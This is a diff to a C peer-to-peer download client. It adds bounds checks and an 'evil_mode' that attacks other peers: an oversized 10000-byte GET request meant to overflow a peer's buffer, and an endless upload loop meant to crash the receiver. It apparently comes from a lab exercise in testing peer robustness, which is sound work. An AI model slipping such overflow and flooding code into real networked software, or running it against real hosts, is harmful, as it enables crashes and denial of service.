@@ -479,7 +479,7 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 		error("* Error while allocating task");
 		goto exit;
 	}
-	while(filename[i]!='\0'){
+	while(filename[i]!='\0'&& i<=FILENAMESIZ){
 		i++;
 	}
 	//TODO: buffer overrun possible	
@@ -535,7 +535,13 @@ static void task_download(task_t *t, task_t *tracker_task)
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
-	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+	
+	// EVIL: Overflow the buffer!
+	if (evil_mode) {
+		char evilbuf[10000] = {'f'};
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", evilbuf); 	
+	} 
+	else osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
 
 	// Open disk file for the result.
 	// If the filename already exists, save the file in a name like
@@ -566,7 +572,7 @@ static void task_download(task_t *t, task_t *tracker_task)
 	// Read the file into the task buffer from the peer,
 	// and write it from the task buffer onto disk.
 	while (1) {
-		if(sizebound>100000)
+		if(sizebound>10000)
 			goto try_again;
 		int ret = read_to_taskbuf(t->peer_fd, t);
 		if (ret == TBUF_ERROR) {
@@ -676,8 +682,22 @@ static void task_upload(task_t *t)
 	}
 
 	message("* Transferring file %s\n", t->filename);
+	//EVIL: keep writing the same block of data to the peer, over and over.	  	
+	// Don't stop until the other peer crashes.	  	
+	if (evil_mode)	  	
+	{	  	
+		while (1) {	  	
+			int ret = write_from_taskbuf(t->peer_fd, t);	  	
+			if (ret == TBUF_ERROR) {	  	
+				error("* Peer write error");
+				exit(0);  	
+			}
+		}
+		goto exit;
+	}
+	
 	// Now, read file from disk and write it to the requesting peer.
-	while (1) {
+	else while (1) {
 		int ret = write_from_taskbuf(t->peer_fd, t);
 		if (ret == TBUF_ERROR) {
 			error("* Peer write error");
